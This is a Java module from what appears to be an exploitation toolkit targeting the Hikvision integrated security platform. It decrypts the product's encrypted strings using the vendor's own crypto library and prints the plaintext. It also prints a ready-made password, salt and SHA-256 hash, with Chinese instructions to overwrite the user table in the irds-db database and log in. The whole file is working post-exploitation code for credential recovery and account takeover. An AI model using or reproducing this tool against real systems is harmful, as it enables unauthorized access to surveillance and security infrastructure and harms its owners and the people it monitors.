package com.exploitx.decrypt.hikvision;

import com.exploitx.core.DecryptInterface;
import com.exploitx.tools.Utils;
import com.hikvision.hik.crypt.IdentifyLibrary;

import java.util.Base64;

public class ZongHeAnFang implements DecryptInterface {
    private boolean isSuccess = false;
    private String encoded_string = "";
    private String Key = "";
    private String Pass = "";
    private String plain_string = "";

    @Override
    public boolean isSuccess() {
        return isSuccess;
    }

    @Override
    public String Decrypt(String encoded_string, String Key, String Pass) {
        this.encoded_string = encoded_string;
        this.Pass = Pass;
        this.Key = Key;
        String results = "[+] 生成密码成功：P@ssw0rd0.\n";
        results += "\t[+] 生成salt成功：c4ca4238a0b923820dcc509a6f75849b\n";
        results += "\t[+] 替换irds/irds-db中user表的password和salt字段后登录确认资产归属\n";
        results += "\t[+] password: " + Utils.getSHA256("P@ssw0rd0.c4ca4238a0b923820dcc509a6f75849b") + "\n";
        results += "\t[+] salt:c4ca4238a0b923820dcc509a6f75849b\n";
        byte[] decode = Base64.getDecoder().decode(this.encoded_string);
        if (decode == null || decode.length == 0) {
            return null;
        }
        byte[] decrypt = IdentifyLibrary.decrypt(decode);
        if (decrypt == null) {
            return null;
        }
        String s = new String(decrypt);
        results += "\t[+] 解密结果:" + s + "\n";
        isSuccess = true;
        return results;
    }
}
